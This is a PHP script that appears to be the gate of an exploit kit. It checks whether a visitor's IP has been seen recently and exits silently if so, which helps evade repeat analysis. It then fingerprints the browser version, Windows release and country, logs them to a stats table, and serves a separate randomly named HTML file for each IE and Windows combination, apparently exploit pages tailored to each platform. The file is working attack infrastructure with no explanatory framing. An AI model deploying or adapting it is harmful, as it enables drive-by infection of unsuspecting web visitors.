<?php
$XPIE7="cqftxmdpdtxrhu.html";
$VISTAIE7="hmgngqxoipjwc.html";
$XPIE8="fnduylasdvdwhz.html";
$VISTAIE8="xocmkmcogmhrjtx.html";
$IE="xqjoaoelipdp6.html";
$WIN7IE="brazelivjugzxu.html";
$XPOTHER="ivfwdoboavknkty.html";
$VISTAOTHER="fqbmjmazhwfvk.html";
$WIN7OTHER="btkmazjqxzczb.html";/*SEPPARATOR*/
require_once( "epjmanyqducskoi.php" );
require_once( "epxwiwephretk9.php" );
require_once( "yqcwaqdzewisasdud.php" );
$ip = $_SERVER['REMOTE_ADDR'];
$r = mysql_query( "SELECT 1 FROM stats WHERE ip=INET_ATON('{$ip}') AND time>UNIX_TIMESTAMP()-{$BANTIME}" );

if(0 < mysql_num_rows($r)) {
    //header("Location: "."http://www.google.com");
    exit();
}else {
    $browver = getbrowserver($MSIEversion, $OPERAversion);
    $browtype = getbrowsertype( );
    $osver = getosver( );
    $country = getcountry( );
    $referer = "---";
    $source = "NOT_AVAILABLE_IN_THIS_VERSION";
    if(isset($_SERVER['HTTP_REFERER']))
	{
        	$refurl = $_SERVER['HTTP_REFERER'];
        	$url = parse_url( $refurl );
        	$referer = preg_replace('/[^a-zA-Z0-9\.\-]/','',$url['host']);
    	}

    mysql_query( "INSERT INTO stats (ip,time,browver,browtype,osver,country,referer,hit) VALUES (INET_ATON('{$ip}'),UNIX_TIMESTAMP(),'{$browver}','{$browtype}','{$osver}','{$country}','{$referer}','0')" );

header("Content-Type: text/html; charset=Windows-1251");
    switch ($browtype) {
        case "MSIE" :
            if (($MSIEversion == 7.0) and (($osver=="Windows XP") or ($osver=="Windows XP SP2") or ($osver=="Windows 2003"))) {
                readfile( $XPIE7 );
            }
            if (($MSIEversion == 7.0) and ($osver=="Windows Vista")) {
                readfile( $VISTAIE7 );
            }
            if (($MSIEversion == 8.0) and (($osver=="Windows XP") or ($osver=="Windows XP SP2") or ($osver=="Windows 2003"))) {
                readfile( $XPIE8 );
            }
            if (($MSIEversion == 8.0) and ($osver=="Windows Vista")) {
                readfile( $VISTAIE8 );
            }
            if ((($MSIEversion != 8.0) and ($MSIEversion != 7.0))) {
                readfile( $IE );
            }
            if ($osver=="Windows 7") {
                readfile( $WIN7IE );
            }
            break;
        default :
            if (($osver=="Windows XP") or ($osver=="Windows XP SP2") or ($osver=="Windows 2003")) {
                readfile( $XPOTHER );
            }
            if ($osver=="Windows Vista") {
                readfile( $VISTAOTHER );
            }
            if ($osver=="Windows 7") {
                readfile( $WIN7OTHER );
            }
    }
    exit();
}
?>
